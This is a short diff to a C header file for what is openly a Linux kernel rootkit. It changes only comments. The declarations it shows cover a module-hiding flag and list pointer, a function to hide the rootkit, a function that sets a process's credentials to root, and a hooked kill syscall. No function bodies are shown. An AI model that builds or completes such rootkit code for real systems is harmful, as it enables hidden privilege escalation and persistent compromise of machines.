@@ -1,6 +1,8 @@
-/*
-file for the all of the hooked functions and other relevant code
-*/
+/*=====================================================================*\
+  function declerations and global variables for hooked_syscalls.c file
+\*=====================================================================*/
+
+
 #include <linux/dirent.h>
 
 extern int BUFFER_SIZE;
@@ -9,7 +11,7 @@ bool module_hidden = false;
 static struct list_head *prev_module; //location of the previous module
 
 static int hide_rootkit(void); //function to unhide\hide the rootkit
-static int set_root(void); //changes credentials
+static int set_root(void); //changes credentials of process to root
 
 //hook functions
 static asmlinkage long hooked_kill(const struct pt_regs *regs);
